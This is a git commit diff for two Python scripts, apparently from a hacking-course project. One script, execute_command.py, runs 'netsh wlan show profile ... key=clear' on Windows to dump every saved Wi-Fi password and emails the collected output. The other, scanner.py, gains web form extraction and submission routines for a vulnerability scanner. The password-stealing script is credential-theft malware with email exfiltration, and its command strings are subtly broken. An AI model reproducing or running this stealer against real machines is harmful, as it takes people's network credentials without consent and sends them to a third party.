1b91face9d8c0e4e3ffe2af2ccfffe0a4aac8e48
Pawan <goodoldie1996@gmail.com>
2021-05-18 01:20:23 -0400

    Updated few files

--- execute_command.py
+++ execute_command.py
@@ -11,6 +11,12 @@ def send_mail(email, password, message):
 
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
-network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
-print(network_names.group(1))
-send_mail("", "", "")
+network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+
+result = ""
+for network_name in network_names_list:
+    command = "netsh wlan show profile" + network_name + "key=clear"
+    current_result = subprocess.check_output(command, shell=True)
+    result = result + current_result
+
+send_mail("", "", result)
--- scanner.py
+++ scanner.py
@@ -1,7 +1,9 @@
 import requests, re, urlparse
+from bs4 import BeautifulSoup
 
 class Scanner:
     def __init__(self, url):
+        self.session = requests.Session()
         self.target_url = url
         self.target_links = []
 
@@ -23,3 +25,29 @@ class Scanner:
                 self.target_links.append(link)
                 print(link)
                 self.crawl(link)
+
+
+    def extract_forms(self, url):
+        response = self.session.get(url)
+        parsed_html = BeautifulSoup(response.content, features="lxml")
+        return parsed_html.findAll("form")
+
+
+    def submit_form(self, form, value, url):
+        action = form.get("action")
+        post_url = urlparse.urljoin(url, action)
+        method = form.get("method")
+
+        inputs_list = form.findAll("input")
+        post_data = {}
+        for input in inputs_list:
+            input_name = input.get("name")
+            input_type = input.get("type")
+            input_value = input.get("value")
+            if input_type == "text":
+                input_value = value
+
+            post_data[input_name] = input_value
+        if method == "post":
+            return self.session.post(post_url, data=post_data)
+        return self.session.get(post_url, params=post_data)
